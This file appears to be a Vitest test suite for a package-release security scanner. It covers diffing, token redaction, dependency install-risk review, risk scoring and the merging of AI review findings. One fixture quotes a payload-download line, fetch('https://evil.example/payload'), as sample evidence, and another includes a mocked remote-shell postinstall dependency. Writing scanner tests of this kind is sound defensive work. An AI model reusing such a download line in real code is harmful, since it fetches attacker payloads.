import { afterEach, describe, expect, test, vi } from "vitest";

const dbMock = vi.hoisted(() => ({
  persistScan: vi.fn(async () => ({ persisted: true })),
  recordScanEvent: vi.fn(async () => undefined),
}));

vi.mock("../server/db/events.ts", () => dbMock);
vi.mock("../server/db/scans.ts", () => dbMock);

const {
  resolveBaseline,
  computeDiff,
  runDeterministicFindings,
  summarizeResolvedArtifacts,
  releaseResolvedArtifacts,
  analyzeRelease,
  scoreRisk,
  mergeAiFindings,
  resolveReleaseConsistency,
  persistResults,
  recordCompletion,
} = await import("../server/lib/scan/pipeline-phases");

const NPM_TOKEN = "npm_abcdefghijklmnopqrstuvwxyz0123";

const identity = { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" };

const baselineArtifact = {
  files: [
    {
      path: "package.json",
      size: 50,
      sha256: "prev-pkg",
      flags: [],
      textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
    },
    {
      path: "index.js",
      size: 20,
      sha256: "prev-index",
      flags: [],
      textSample: "export const value = 1;\n",
    },
  ],
  manifest: { name: "pkg", version: "1.0.0" },
};

const stagedArtifact = {
  files: [
    {
      path: "package.json",
      size: 60,
      sha256: "staged-pkg",
      flags: [],
      textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
    },
    {
      path: "index.js",
      size: 40,
      sha256: "staged-index",
      flags: [],
      textSample: `export const value = 2;\nconst t = '${NPM_TOKEN}';\n`,
    },
    {
      path: "added.js",
      size: 10,
      sha256: "added",
      flags: [],
      textSample: "console.log('new');\n",
    },
  ],
  manifest: { name: "pkg", version: "1.0.1" },
};

// Same staged side, but the manifest declares a repository. The declared
// repository has to survive `analyzeRelease` dropping the raw manifest text.
const stagedArtifactWithRepository = {
  ...stagedArtifact,
  files: [
    {
      ...stagedArtifact.files[0],
      textSample: JSON.stringify({
        name: "pkg",
        version: "1.0.1",
        repository: "git+https://github.com/acme/pkg.git",
      }),
    },
    ...stagedArtifact.files.slice(1),
  ],
};

const baselineInfo = {
  version: "1.0.0",
  tag: "latest",
  source: "dist-tag",
  distTagVersion: "1.0.0",
  reason: "test baseline",
};

const resolved = {
  staged: { artifact: stagedArtifact, details: { stageId: "stage-1" } },
  baseline: { artifact: baselineArtifact, baseline: baselineInfo },
};

const disabledAi = {
  status: "unavailable",
  risk: "low",
  releaseAssessment: "not_assessed",
  summary: "AI review is disabled.",
  findings: [],
  requiresManualReview: false,
  model: null,
};

const absentIntentEnvelope = { tier: "absent", repository: null, signals: [] };

function makeAdapter(overrides = {}) {
  return {
    id: "fake",
    codePatternSet: "javascript",
    parseInput: (raw) => raw,
    createBroker: () => ({ dispose() {} }),
    acquireStaged: vi.fn(async () => resolved.staged),
    acquireBaseline: vi.fn(async () => resolved.baseline),
    runFindings: vi.fn(() => [
      {
        severity: "high",
        file: "index.js",
        evidence: `token ${NPM_TOKEN}`,
        reason: "credential-like content on a changed line",
        line: 2,
        ruleId: "code.credential-access",
        ruleVersion: "1.6.2",
      },
    ]),
    describe: vi.fn(() => ({
      name: "pkg",
      stagedVersion: "1.0.1",
      stagedTag: "latest",
      previousVersion: "1.0.0",
    })),
    summarizeDetails: vi.fn(() => ({ stageId: "stage-1" })),
    ...overrides,
  };
}

afterEach(() => {
  dbMock.persistScan.mockClear();
  dbMock.recordScanEvent.mockClear();
});

describe("resolveBaseline", () => {
  test("acquires the staged artifact, then the baseline it is threaded into", async () => {
    const adapter = makeAdapter();
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };
    const broker = { dispose() {} };
    const input = { stageId: "stage-1" };

    const out = await resolveBaseline(adapter, ctx, input, broker);

    expect(adapter.acquireStaged).toHaveBeenCalledWith(ctx, input, broker);
    expect(adapter.acquireBaseline).toHaveBeenCalledWith(ctx, input, broker, resolved.staged);
    expect(out).toEqual({ staged: resolved.staged, baseline: resolved.baseline });
  });
});

describe("computeDiff", () => {
  test("diffs files + manifest and extracts the staged package.json text", () => {
    const diff = computeDiff(resolved);

    const statusByPath = Object.fromEntries(diff.fileDiff.map((e) => [e.path, e.status]));
    expect(statusByPath["package.json"]).toBe("modified");
    expect(statusByPath["index.js"]).toBe("modified");
    expect(statusByPath["added.js"]).toBe("added");

    expect(diff.manifestDiff.previousVersion).toBe("1.0.0");
    expect(diff.manifestDiff.stagedVersion).toBe("1.0.1");
    expect(diff.stagedManifestText).toBe(JSON.stringify({ name: "pkg", version: "1.0.1" }));
  });
});

describe("runDeterministicFindings", () => {
  test("runs adapter rules, redacts evidence + file text, and annotates release delta", () => {
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);

    const out = runDeterministicFindings(adapter, resolved, diff);

    expect(adapter.runFindings).toHaveBeenCalledWith(
      expect.objectContaining({
        staged: stagedArtifact,
        baseline: baselineArtifact,
        fileDiff: diff.fileDiff,
        manifestDiff: diff.manifestDiff,
        stagedManifestText: diff.stagedManifestText,
      }),
    );

    expect(out.ruleFindings[0].evidence).toBe("token [REDACTED_NPM_TOKEN]");

    const stagedIndex = out.redactedStagedFiles.find((f) => f.path === "index.js");
    expect(stagedIndex.textSample).toContain("[REDACTED_NPM_TOKEN]");
    expect(stagedIndex.textSample).not.toContain(NPM_TOKEN);

    expect(out.annotatedFindings[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });

    expect(out.releaseRuleFindings[0]).toMatchObject({
      file: "index.js",
      ruleId: "code.credential-access",
    });
    expect(out.releaseRuleFindings[0]).not.toHaveProperty("diffStatus");
    expect(out.releaseRuleFindings[0]).not.toHaveProperty("releaseDelta");

    expect(adapter.summarizeDetails).toHaveBeenCalledWith(resolved.staged.details);
    expect(out.redactedDetails).toEqual({ stageId: "stage-1" });
  });

  test("returns empty redacted previous files when there is no baseline", () => {
    const adapter = makeAdapter();
    const noBaseline = {
      staged: resolved.staged,
      baseline: { artifact: null, baseline: baselineInfo },
    };
    const diff = computeDiff(noBaseline);

    const out = runDeterministicFindings(adapter, noBaseline, diff);

    expect(out.redactedPreviousFiles).toEqual([]);
    expect(out.redactedPreviousManifest).toBeNull();
  });
});

describe("summarizeResolvedArtifacts", () => {
  test("projects the package summary + counts so later phases need no raw artifact", () => {
    const adapter = makeAdapter();

    const facts = summarizeResolvedArtifacts(adapter, { stageId: "stage-1" }, resolved);

    expect(facts).toEqual({
      packageSummary: {
        name: "pkg",
        stagedVersion: "1.0.1",
        stagedTag: "latest",
        previousVersion: "1.0.0",
      },
      fileCount: 3,
      previousFileCount: 2,
      baseline: baselineInfo,
      previousVersionAvailable: true,
      baselineComparisonSkipped: false,
      declaredRepository: null,
    });
    // Nothing in the facts carries file text: that is the whole point.
    expect(JSON.stringify(facts)).not.toContain(NPM_TOKEN);
    expect(JSON.stringify(facts)).not.toContain("export const value");
  });

  test("carries the staged manifest's declared repository", () => {
    const facts = summarizeResolvedArtifacts(
      makeAdapter(),
      { stageId: "stage-1" },
      {
        ...resolved,
        staged: { ...resolved.staged, artifact: stagedArtifactWithRepository },
      },
    );

    expect(facts.declaredRepository).toBe("https://github.com/acme/pkg");
  });

  test("does not retain an oversized raw repository object in artifact facts", () => {
    const oversizedRepository = {
      url: "git+https://github.com/acme/pkg.git",
      padding: "x".repeat(2 * 1024 * 1024),
    };
    const facts = summarizeResolvedArtifacts(
      makeAdapter(),
      { stageId: "stage-1" },
      {
        ...resolved,
        staged: {
          ...resolved.staged,
          artifact: {
            ...stagedArtifact,
            files: [
              {
                ...stagedArtifact.files[0],
                textSample: JSON.stringify({
                  name: "pkg",
                  version: "1.0.1",
                  repository: oversizedRepository,
                }),
              },
              ...stagedArtifact.files.slice(1),
            ],
          },
        },
      },
    );

    expect(facts.declaredRepository).toBe("https://github.com/acme/pkg");
    expect(JSON.stringify(facts).length).toBeLessThan(1_000);
  });

  test("falls back to PyPI core metadata when there is no package.json", () => {
    const facts = summarizeResolvedArtifacts(
      makeAdapter(),
      { stageId: "stage-1" },
      {
        ...resolved,
        staged: {
          ...resolved.staged,
          artifact: {
            files: [
              {
                path: "pkg-1.0.1/PKG-INFO",
                size: 80,
                sha256: "pkg-info",
                flags: [],
                textSample:
                  "Metadata-Version: 2.1\nName: pkg\nProject-URL: Source, https://github.com/acme/pkg\n",
              },
            ],
            manifest: null,
          },
        },
      },
    );

    expect(facts.declaredRepository).toBe("https://github.com/acme/pkg");
  });
});

describe("analyzeRelease", () => {
  function clonedResolved() {
    return {
      staged: {
        artifact: {
          files: stagedArtifact.files.map((file) => ({ ...file })),
          manifest: { ...stagedArtifact.manifest },
          suspiciousTarEntries: [{ kind: "duplicate", path: "index.js", detail: "dupe" }],
        },
        details: { stageId: "stage-1" },
      },
      baseline: {
        artifact: {
          files: baselineArtifact.files.map((file) => ({ ...file })),
          manifest: { ...baselineArtifact.manifest },
        },
        baseline: baselineInfo,
      },
    };
  }

  test("runs findings on raw text, then releases both sides' unredacted files", async () => {
    const acquired = clonedResolved();
    // Captured inside runFindings: the arrays it is handed are the ones that get
    // released afterwards, so the sample has to be read at call time.
    let scannedStagedSample = null;
    let scannedBaselineFileCount = null;
    const base = makeAdapter();
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
      runFindings: vi.fn((args) => {
        scannedStagedSample = args.staged.files.find((f) => f.path === "index.js").textSample;
        scannedBaselineFileCount = args.baseline.files.length;
        return base.runFindings(args);
      }),
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    const out = await analyzeRelease(
      adapter,
      ctx,
      { stageId: "stage-1" },
      { dispose() {} },
      identity,
    );

    // Order invariant: rules see the unredacted body, redaction happens after.
    expect(scannedStagedSample).toContain(NPM_TOKEN);
    expect(scannedBaselineFileCount).toBe(2);
    expect(
      out.findings.redactedStagedFiles.find((f) => f.path === "index.js").textSample,
    ).toContain("[REDACTED_NPM_TOKEN]");

    // Raw arrays are gone once findings have run: only the redacted copies and
    // the metadata-only diff survive into report assembly.
    expect(acquired.staged.artifact.files).toEqual([]);
    expect(acquired.staged.artifact.suspiciousTarEntries).toBeUndefined();
    expect(acquired.baseline.artifact.files).toEqual([]);
    expect(out.findings.redactedStagedFiles).toHaveLength(3);
    expect(out.findings.redactedPreviousFiles).toHaveLength(2);
    expect(out.facts.fileCount).toBe(3);
    expect(out.facts.previousFileCount).toBe(2);
    expect(out.diff.fileDiff.length).toBe(3);
  });

  test("drops the raw staged manifest text once the rules have read it", async () => {
    const acquired = clonedResolved();
    let manifestTextSeenByRules;
    const base = makeAdapter();
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
      runFindings: vi.fn((args) => {
        manifestTextSeenByRules = args.stagedManifestText;
        return base.runFindings(args);
      }),
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    const out = await analyzeRelease(
      adapter,
      ctx,
      { stageId: "stage-1" },
      { dispose() {} },
      identity,
    );

    // Rules get the raw manifest; nothing downstream does — the redacted
    // summary on `findings` is what persistence uses.
    expect(manifestTextSeenByRules).toBe(JSON.stringify({ name: "pkg", version: "1.0.1" }));
    expect(out.diff.stagedManifestText).toBeNull();
    expect(out.findings.redactedStagedManifest).toMatchObject({ name: "pkg", version: "1.0.1" });
  });

  test("surfaces the declared repository even though the raw evidence is gone", async () => {
    const acquired = clonedResolved();
    acquired.staged.artifact.files = stagedArtifactWithRepository.files.map((file) => ({
      ...file,
    }));
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    const out = await analyzeRelease(
      adapter,
      ctx,
      { stageId: "stage-1" },
      { dispose() {} },
      identity,
    );

    // Both inputs the extraction needs are dead by the time `analyzeRelease`
    // returns, so the fact has to be projected inside the boundary. Reading it
    // from the caller is what silently blanks every intent envelope.
    expect(out.diff.stagedManifestText).toBeNull();
    expect(acquired.staged.artifact.files).toEqual([]);
    expect(out.facts.declaredRepository).toBe("https://github.com/acme/pkg");
  });

  test("dependency evidence rides the same redaction and annotation path as any rule finding", async () => {
    const acquired = clonedResolved();
    const inspectAddedDependencies = vi.fn(async () => ({
      status: "complete",
      selectedCount: 1,
      inspectedCount: 1,
      uninspectableCount: 0,
      dependencies: [
        {
          name: "proc-macro1",
          section: "dependencies",
          declaredSpec: "0.1.0",
          declarationKind: "exact",
          status: "inspected",
          reason: null,
          resolvedVersion: "0.1.0",
          registryHost: "registry.npmjs.org",
          artifactUrl: "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz",
          declaredDigest: null,
          reviewedDigest: null,
          digestVerified: null,
          fileCount: 2,
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.remote-shell"],
          installReachableCapabilities: ["code.remote-shell"],
          verdict: "install-risk",
        },
      ],
    }));
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
      inspectAddedDependencies,
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    const out = await analyzeRelease(
      adapter,
      ctx,
      { stageId: "stage-1" },
      { dispose() {} },
      identity,
    );

    expect(inspectAddedDependencies).toHaveBeenCalledWith(
      ctx,
      expect.anything(),
      expect.objectContaining({
        scanId: "scan-1",
        organizationId: "org-1",
        baselineManifestUnavailable: false,
        stagedManifest: expect.objectContaining({ name: "pkg", version: "1.0.1" }),
        stagedFiles: expect.arrayContaining([expect.objectContaining({ path: "package.json" })]),
      }),
    );
    const finding = out.findings.ruleFindings.find(
      (entry) => entry.ruleId === "dependency-artifact.install-risk",
    );
    expect(finding.severity).toBe("critical");
    // Release-scoped: the whole point of the family is what THIS release starts
    // shipping, so it has to reach `releaseRisk` and therefore the gate.
    const annotated = out.findings.annotatedFindings.find(
      (entry) => entry.ruleId === "dependency-artifact.install-risk",
    );
    expect(annotated.releaseDelta).toBe(true);
    expect(out.findings.releaseRuleFindings.map((entry) => entry.ruleId)).toContain(
      "dependency-artifact.install-risk",
    );
    expect(out.findings.dependencyReview.dependencies).toHaveLength(1);
  });

  test("the dependency pass runs after both package sides' raw files are released", async () => {
    // Ordering invariant, not a detail: the pass makes bounded network calls,
    // and holding two unredacted package sides alive for their duration is
    // exactly the peak memory that caps reviewable package size.
    const acquired = clonedResolved();
    let stagedFilesAtInspection = null;
    let baselineFilesAtInspection = null;
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
      inspectAddedDependencies: vi.fn(async () => {
        stagedFilesAtInspection = acquired.staged.artifact.files.length;
        baselineFilesAtInspection = acquired.baseline.artifact.files.length;
        return {
          status: "not-applicable",
          selectedCount: 0,
          inspectedCount: 0,
          uninspectableCount: 0,
          dependencies: [],
        };
      }),
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    await analyzeRelease(adapter, ctx, { stageId: "stage-1" }, { dispose() {} }, identity);

    expect(stagedFilesAtInspection).toBe(0);
    expect(baselineFilesAtInspection).toBe(0);
  });

  test("a dependency pass that throws remains a visible gap without failing the scan", async () => {
    const acquired = clonedResolved();
    acquired.staged.artifact.manifest.dependencies = { added: "1.0.0" };
    acquired.staged.artifact.files[0].textSample = JSON.stringify({
      name: "pkg",
      version: "1.0.1",
      dependencies: { added: "1.0.0" },
    });
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
      inspectAddedDependencies: vi.fn(async () => {
        throw new Error("registry unreachable");
      }),
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    const out = await analyzeRelease(
      adapter,
      ctx,
      { stageId: "stage-1" },
      { dispose() {} },
      identity,
    );

    expect(out.findings.dependencyReview).toMatchObject({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
      dependencies: [{ name: "added", reason: "review-failed" }],
    });
    const dependencyFinding = out.findings.ruleFindings.find(
      (entry) => entry.ruleId === "dependency-artifact.uninspectable",
    );
    expect(dependencyFinding).toMatchObject({ severity: "medium" });
  });

  test("marks a missing baseline manifest as unavailable when acquisition failed", async () => {
    const acquired = clonedResolved();
    acquired.staged.artifact.manifest.dependencies = { added: "1.0.0" };
    acquired.staged.artifact.files[0].textSample = JSON.stringify({
      name: "pkg",
      version: "1.0.1",
      dependencies: { added: "1.0.0" },
    });
    acquired.baseline = {
      artifact: null,
      baseline: { ...baselineInfo, version: null, reason: "baseline-unavailable" },
    };
    const inspectAddedDependencies = vi.fn(async () => ({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
      dependencies: [],
    }));
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
      inspectAddedDependencies,
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    await analyzeRelease(adapter, ctx, { stageId: "stage-1" }, { dispose() {} }, identity);

    expect(inspectAddedDependencies).toHaveBeenCalledWith(
      ctx,
      expect.anything(),
      expect.objectContaining({ baselineManifestUnavailable: true }),
    );
  });

  test("an adapter without the capability records an empty review", async () => {
    const acquired = clonedResolved();
    const adapter = makeAdapter({
      acquireStaged: vi.fn(async () => acquired.staged),
      acquireBaseline: vi.fn(async () => acquired.baseline),
    });
    const ctx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user-1" } };

    const out = await analyzeRelease(
      adapter,
      ctx,
      { stageId: "stage-1" },
      { dispose() {} },
      identity,
    );

    expect(out.findings.dependencyReview).toEqual({
      status: "not-applicable",
      selectedCount: 0,
      inspectedCount: 0,
      uninspectableCount: 0,
      omittedCount: 0,
      dependencies: [],
    });
  });

  test("releaseResolvedArtifacts tolerates a scan with no baseline artifact", () => {
    const acquired = clonedResolved();
    acquired.baseline = { artifact: null, baseline: baselineInfo };

    expect(() => releaseResolvedArtifacts(acquired)).not.toThrow();
    expect(acquired.staged.artifact.files).toEqual([]);
  });
});

describe("scoreRisk", () => {
  test("splits release vs context findings into the risk breakdown", () => {
    const annotated = [
      {
        severity: "high",
        file: "a",
        evidence: "",
        reason: "",
        releaseDelta: true,
        diffStatus: "added",
      },
      {
        severity: "medium",
        file: "b",
        evidence: "",
        reason: "",
        releaseDelta: false,
        diffStatus: "unchanged",
      },
    ];

    const summary = scoreRisk(annotated, disabledAi);

    expect(summary.artifactRisk).toBe("high");
    expect(summary.releaseRisk).toBe("high");
    expect(summary.contextRisk).toBe("medium");
    expect(summary.releaseFindingCount).toBe(1);
    expect(summary.contextFindingCount).toBe(1);
  });
});

function makeCompleteAiReview(overrides = {}) {
  return {
    status: "complete",
    risk: "critical",
    releaseAssessment: "suspicious",
    summary: "Staged payload downloader added.",
    findings: [
      {
        severity: "critical",
        file: "added.js",
        evidence: "fetch('https://evil.example/payload')",
        reason: "downloads and executes a staged payload",
        recommendation: "block the release",
      },
    ],
    requiresManualReview: true,
    model: "test-model",
    ...overrides,
  };
}

describe("mergeAiFindings", () => {
  test("projects a completed review's findings into annotated Finding records", () => {
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);
    const findings = runDeterministicFindings(adapter, resolved, diff);

    const merged = mergeAiFindings(makeCompleteAiReview(), findings, diff, "javascript");

    expect(merged.records).toEqual([
      {
        severity: "critical",
        file: "added.js",
        evidence: "fetch('https://evil.example/payload')",
        reason: "downloads and executes a staged payload",
      },
    ]);
    // added.js is new in this release, so the AI finding scopes to the release delta.
    expect(merged.annotatedRecords[0]).toMatchObject({
      file: "added.js",
      diffStatus: "added",
      releaseDelta: true,
    });
  });

  test("redacts secret material quoted in AI evidence", () => {
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);
    const findings = runDeterministicFindings(adapter, resolved, diff);
    const review = makeCompleteAiReview({
      findings: [
        {
          severity: "high",
          file: "index.js",
          evidence: `hardcoded token ${NPM_TOKEN}`,
          reason: "credential in source",
          recommendation: "rotate the token",
        },
      ],
    });

    const merged = mergeAiFindings(review, findings, diff, "javascript");

    expect(merged.records[0].evidence).toContain("[REDACTED_NPM_TOKEN]");
    expect(merged.records[0].evidence).not.toContain(NPM_TOKEN);
  });

  test("contributes nothing when the review did not complete", () => {
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);
    const findings = runDeterministicFindings(adapter, resolved, diff);

    for (const review of [
      disabledAi,
      makeCompleteAiReview({ status: "invalid" }),
      makeCompleteAiReview({ releaseAssessment: "not_assessed" }),
    ]) {
      const merged = mergeAiFindings(review, findings, diff, "javascript");
      expect(merged).toEqual({ records: [], annotatedRecords: [] });
    }
  });

  test("AI findings escalate the risk breakdown but never downgrade deterministic findings", () => {
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);
    const findings = runDeterministicFindings(adapter, resolved, diff);

    // Deterministic-only baseline: the rule finding grades high.
    const deterministicOnly = scoreRisk(findings.annotatedFindings, disabledAi);
    expect(deterministicOnly.artifactRisk).toBe("high");

    // A low-severity AI finding must not lower any deterministic grade.
    const lowReview = makeCompleteAiReview({
      risk: "low",
      releaseAssessment: "nothing_unusual",
      requiresManualReview: false,
      findings: [
        {
          severity: "low",
          file: "added.js",
          evidence: "console.log('new')",
          reason: "routine logging",
          recommendation: "none",
        },
      ],
    });
    const lowMerge = mergeAiFindings(lowReview, findings, diff, "javascript");
    const withLowAi = scoreRisk(
      [...findings.annotatedFindings, ...lowMerge.annotatedRecords],
      lowReview,
    );
    expect(withLowAi.artifactRisk).toBe(deterministicOnly.artifactRisk);
    expect(withLowAi.releaseRisk).toBe(deterministicOnly.releaseRisk);
    expect(withLowAi.contextRisk).toBe(deterministicOnly.contextRisk);
    // The AI finding is counted, in addition to the deterministic one.
    expect(withLowAi.releaseFindingCount).toBe(deterministicOnly.releaseFindingCount + 1);

    // A critical AI finding escalates.
    const criticalReview = makeCompleteAiReview();
    const criticalMerge = mergeAiFindings(criticalReview, findings, diff, "javascript");
    const withCriticalAi = scoreRisk(
      [...findings.annotatedFindings, ...criticalMerge.annotatedRecords],
      criticalReview,
    );
    expect(withCriticalAi.artifactRisk).toBe("critical");
    expect(withCriticalAi.releaseRisk).toBe("critical");
  });
});

const noneConsistency = {
  status: "none",
  priorScanId: null,
  priorVersion: null,
  decidedAt: null,
  currentFindingCount: 1,
  priorFindingCount: 0,
  newFindingCount: 0,
  newFindings: [],
};

describe("resolveReleaseConsistency", () => {
  test("degrades to none (never throws) when the db lookup fails", async () => {
    const out = await resolveReleaseConsistency({
      db: {},
      identity: { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" },
      packageName: "pkg",
      ruleFindings: [{ severity: "high", file: "index.js", evidence: "", reason: "" }],
    });

    expect(out).toEqual(noneConsistency);
  });

  test("returns none without a db read when the scan has no package name", async () => {
    const out = await resolveReleaseConsistency({
      db: {},
      identity: { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" },
      packageName: null,
      ruleFindings: [{ severity: "high", file: "index.js", evidence: "", reason: "" }],
    });

    expect(out).toEqual(noneConsistency);
  });
});

describe("persistResults", () => {
  test("assembles the scan result and persists a completed scan", async () => {
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);
    const findings = runDeterministicFindings(adapter, resolved, diff);
    const riskSummary = scoreRisk(findings.annotatedFindings, disabledAi);
    const identity = { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" };

    const { result, persisted } = await persistResults({
      db: {},
      session: { userId: "user-1" },
      adapter,
      identity,
      facts: summarizeResolvedArtifacts(adapter, { stageId: "stage-1" }, resolved),
      diff,
      findings,
      aiFindings: disabledAi,
      riskSummary,
      releaseConsistency: noneConsistency,
      intentEnvelope: absentIntentEnvelope,
    });

    expect(persisted).toBe(true);
    expect(result).toMatchObject({
      id: "scan-1",
      stageId: "stage-1",
      package: { name: "pkg", stagedVersion: "1.0.1", previousVersion: "1.0.0" },
      baseline: baselineInfo,
      fileCount: 3,
      previousFileCount: 2,
      risk: riskSummary.artifactRisk,
      ruleFindings: findings.ruleFindings,
    });
    expect(result.safety.tokenExposedToSandbox).toBe(false);
    expect(adapter.describe).toHaveBeenCalledTimes(1);

    const persistArg = dbMock.persistScan.mock.calls[0][1];
    expect(persistArg).toMatchObject({
      id: "scan-1",
      status: "complete",
      risk: riskSummary.artifactRisk,
      organizationId: "org-1",
      ownerUserId: "user-1",
      previousPackageJson: { name: "pkg", version: "1.0.0" },
    });
    expect(persistArg.summary.report.digest).toMatch(/^[0-9a-f]{64}$/);
    expect(persistArg.summary.report.rulesVersion).toBeDefined();

    // Release memory rides the result + persisted summary, advisory only.
    expect(result.releaseConsistency).toEqual(noneConsistency);
    expect(persistArg.summary.releaseConsistency).toEqual(noneConsistency);
    // The advisory envelope rides the summary blob and the scan result verbatim.
    expect(persistArg.summary.intentEnvelope).toEqual(absentIntentEnvelope);
    expect(result.intentEnvelope).toEqual(absentIntentEnvelope);
  });

  test("persists AI finding records after the rule findings with combined annotations", async () => {
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);
    const findings = runDeterministicFindings(adapter, resolved, diff);
    const aiReview = makeCompleteAiReview();
    const mergedAiFindings = mergeAiFindings(aiReview, findings, diff, "javascript");
    const riskSummary = scoreRisk(
      [...findings.annotatedFindings, ...mergedAiFindings.annotatedRecords],
      aiReview,
    );

    await persistResults({
      db: {},
      session: { userId: "user-1" },
      adapter,
      identity: { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" },
      facts: summarizeResolvedArtifacts(adapter, { stageId: "stage-1" }, resolved),
      diff,
      findings,
      aiFindings: aiReview,
      mergedAiFindings,
      riskSummary,
      releaseConsistency: noneConsistency,
    });

    const persistArg = dbMock.persistScan.mock.calls[0][1];
    // Rule findings stay authoritative and unchanged; AI records ride separately.
    expect(persistArg.findings).toEqual(findings.ruleFindings);
    expect(persistArg.aiFindingRecords).toEqual(mergedAiFindings.records);
    expect(persistArg.riskSummary.artifactRisk).toBe("critical");
  });

  test("propagates a non-persisted outcome from persistScan", async () => {
    dbMock.persistScan.mockResolvedValueOnce({ persisted: false, reason: "already_terminal" });
    const adapter = makeAdapter();
    const diff = computeDiff(resolved);
    const findings = runDeterministicFindings(adapter, resolved, diff);
    const riskSummary = scoreRisk(findings.annotatedFindings, disabledAi);

    const { persisted } = await persistResults({
      db: {},
      session: { userId: "user-1" },
      adapter,
      identity: { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" },
      facts: summarizeResolvedArtifacts(adapter, { stageId: "stage-1" }, resolved),
      diff,
      findings,
      aiFindings: disabledAi,
      riskSummary,
      releaseConsistency: noneConsistency,
      intentEnvelope: absentIntentEnvelope,
    });

    expect(persisted).toBe(false);
  });
});

describe("recordCompletion", () => {
  const completedResult = {
    id: "scan-1",
    stageId: "stage-1",
    package: { name: "pkg", stagedVersion: "1.0.1", stagedTag: "latest" },
    fileCount: 3,
    previousFileCount: 2,
    ruleFindings: [],
    risk: "high",
    riskSummary: { releaseRisk: "low", contextRisk: "high", artifactRisk: "high" },
  };
  const identity = { scanId: "scan-1", stageId: "stage-1", organizationId: "org-1" };

  test("completes without writing a scan audit event", async () => {
    await recordCompletion({
      db: {},
      session: { userId: "user-1" },
      identity,
      adapterId: "fake",
      result: completedResult,
      baseline: baselineInfo,
      persisted: true,
      pipelineStartedAtMs: Date.now(),
    });

    expect(dbMock.recordScanEvent).not.toHaveBeenCalled();
  });
});
